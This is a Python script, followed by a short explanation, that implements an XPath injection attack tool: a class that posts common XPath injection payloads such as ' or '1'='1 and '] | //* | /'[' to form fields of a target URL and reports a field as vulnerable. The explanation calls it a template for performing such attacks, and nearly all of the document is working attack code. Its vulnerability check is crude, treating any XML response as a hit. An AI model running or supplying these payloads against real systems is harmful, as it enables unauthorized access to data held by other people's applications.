```python
import requests
from lxml import etree
from utils.constants import API_KEY, INJECTION_VECTORS

class XPathInjection:
    def __init__(self, target_url, api_key=API_KEY):
        self.target_url = target_url
        self.api_key = api_key
        self.injection_points = INJECTION_VECTORS.get('xpath_injection_cases', [])

    def inject_payload(self, payload):
        for point in self.injection_points:
            data = {point: payload}
            response = requests.post(self.target_url, data=data)
            if self.is_vulnerable(response):
                print(f"Vulnerability found at {point} with payload {payload}")
                return True
        return False

    @staticmethod
    def is_vulnerable(response):
        try:
            parsed_response = etree.fromstring(response.content)
            if parsed_response.xpath("name(/*)") != '':
                return True
        except etree.XMLSyntaxError:
            pass
        return False

    def run(self):
        for payload in self.generate_payloads():
            if self.inject_payload(payload):
                break

    @staticmethod
    def generate_payloads():
        # This method should be implemented to generate and return a list of payloads
        # For demonstration purposes, we'll return a simple list of common payloads
        return [
            "' or '1'='1",
            "'] | //* | /'['",
            "' or count(/*)=count(//*) or '"
        ]

if __name__ == "__main__":
    target = "http://example.com/vulnerable_endpoint"
    xpath_injection = XPathInjection(target)
    xpath_injection.run()
```

This script is a template for performing XPath injection attacks. It includes a class `XPathInjection` that can be instantiated with a target URL. It has methods to inject payloads, check if the response is indicative of a vulnerability, run the attack by iterating over generated payloads, and a static method to generate a list of common payloads for testing purposes. The `API_KEY` and `INJECTION_VECTORS` are imported from a shared constants file, adhering to the shared dependencies.